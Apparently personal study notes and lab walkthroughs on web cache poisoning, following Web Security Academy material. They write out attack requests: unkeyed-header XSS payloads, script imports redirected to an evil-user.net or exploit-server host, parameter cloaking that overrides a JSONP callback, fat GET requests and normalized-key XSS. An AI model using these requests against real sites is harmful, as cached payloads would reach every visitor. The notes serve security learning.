## Using web cache poisoning to deliver an XSS attack
Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.
```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```
Here, the value of the `X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the `X-Forwarded-Host` header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:
```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```
If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload.
## Using web cache poisoning to exploit unsafe handling of resource imports
```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```
![](Pasted%20image%2020261013210106.png)
## Using web cache poisoning to exploit cookie-handling vulnerabilities
Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page:
```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```
![](Pasted%20image%2020261013214408.png)
## Using multiple headers to exploit web cache poisoning vulnerabilities
```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
------------------------------------------
GET /resources/js/tracking.js HTTP/2
Host: 0ae1001f03ed738b868885ee00fb001a.web-security-academy.net
X-Forwarded-Host: exploit-0ad000ef035c7328867b84b0010c00a3.exploit-server.net
X-Forwarded-Scheme: nothttps
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
```
![](Pasted%20image%2020261013222918.png)
## Exploiting responses that expose too much information
Pendiente
## Cache probing methodology
### Identify a suitable cache oracle
The first step is to identify a suitable "cache oracle" that you can use for testing. A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior.
```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```
### Probe key handling
Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the `Host` header.
Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the `Host` header to dynamically generate the `Location` header in the response:
```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```
To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:
```
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
Next, we'll send another request, but this time we won't specify a port:
```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```
In short, although the `Host` header is keyed, the way it is transformed by the cache allows us to pass a payload into the application while still preserving a "normal" cache key that will be mapped to other users' requests. This kind of behavior is the key concept behind all of the exploits that we'll discuss in this section.
### Identify an exploitable gadget
These gadgets will often be classic client-side vulnerabilities, such as reflected XSS and open redirects. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.
## Exploiting cache key flaws
### Unkeyed query string
Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit this to issue requests with different keys that still hit the same endpoint. For example, the following entries might all be cached separately but treated as equivalent to `GET /` on the back-end:

Apache: `GET //`
Nginx: `GET /%2F`
PHP: `GET /index.php/xyz`
.NET: `GET /(A(xyz)/`
![](Pasted%20image%2020261014120402.png)
### Unkeyed query parameters
So far we've seen that on some websites, the entire query string is excluded from the cache key. But some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like `utm_content` are good candidates to check during testing.
![](Pasted%20image%2020261014122254.png)
### Cache parameter cloaking
```
GET /?example=123?excluded_param=bad-stuff-here
```
In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second `?` as a delimiter and instead only sees one parameter, `example`, whose value is the entire rest of the query string, including our payload. If the value of `example` is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.
Consider the following request:
```
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```
As the names suggest, `keyed_param` is included in the cache key, but `excluded_param` is not. Many caches will only interpret this as two parameters, delimited by the ampersand:
- `keyed_param=abc`
- `excluded_param=123;keyed_param=bad-stuff-here`
Once the parsing algorithm removes the `excluded_param`, the cache key will only contain `keyed_param=abc`. On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:
- `keyed_param=abc`
- `excluded_param=123`
- `keyed_param=bad-stuff-here`
If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence. The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users.
This exploit can be especially powerful if it gives you control over a function that will be executed. For example, if a website is using JSONP to make a cross-domain request, this will often contain a `callback` parameter to execute a given function on the returned data:
```bash
GET /jsonp?callback=innocentFunction
# In this case, you could use these techniques to override the expected callback function and execute arbitrary JavaScript instead.
```
#### Lab:
- Identify that the `utm_content` parameter is supported. Observe that it is also excluded from the cache key.
- Notice that if you use a semicolon (`;`) to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
- Observe that every page imports the script `/js/geolocate.js`, executing the callback function `setCountryCookie()`. Send the request `GET /js/geolocate.js?callback=setCountryCookie` to Burp Repeater.
- Notice that you can control the name of the function that is called on the returned data by editing the `callback` parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
- Study the cache behavior. Observe that if you add duplicate `callback` parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second `callback` parameter to the `utm_content` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
    
    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction HTTP/1.1 200 OK X-Cache-Key: /js/geolocate.js?callback=setCountryCookie … arbitraryFunction({"country" : "United Kingdom"})`
- Send the request again, but this time pass in `alert(1)` as the callback function:
    
    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
- Get the response cached, then load the home page in the browser. Check that the `alert()` is triggered.
![](Pasted%20image%2020261014125448.png)

### Exploiting fat GET support
The HTTP method may not be keyed. This might allow you to poison the cache with a `POST` request containing a malicious payload in the body. Your payload would then even be served in response to users' `GET` requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a `GET` request to create a "fat" `GET` request:
```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```
This is only possible if a website accepts `GET` requests that have a body, but there are potential workarounds. You can sometimes encourage "fat `GET`" handling by overriding the HTTP method
```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```
![](Pasted%20image%2020261014151428.png)
![](Pasted%20image%2020261014151443.png)
### Exploiting dynamic content in resource imports
consider a page that reflects the current query string in an import statement:
```
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```
You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import `/style.css`.
```
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
```
### Normalized cache keys
Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:
```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```
#### Labs:
- In Burp Repeater, browse to any non-existent path, such as `GET /random`. Notice that the path you requested is reflected in the error message.
- Add a suitable reflected XSS payload to the request line:
    `GET /random</p><script>alert(1)</script><p>foo`
- Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.
- In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the `alert()` is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
- Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.
![](Pasted%20image%2020261014155631.png)
![](Pasted%20image%2020261014155648.png)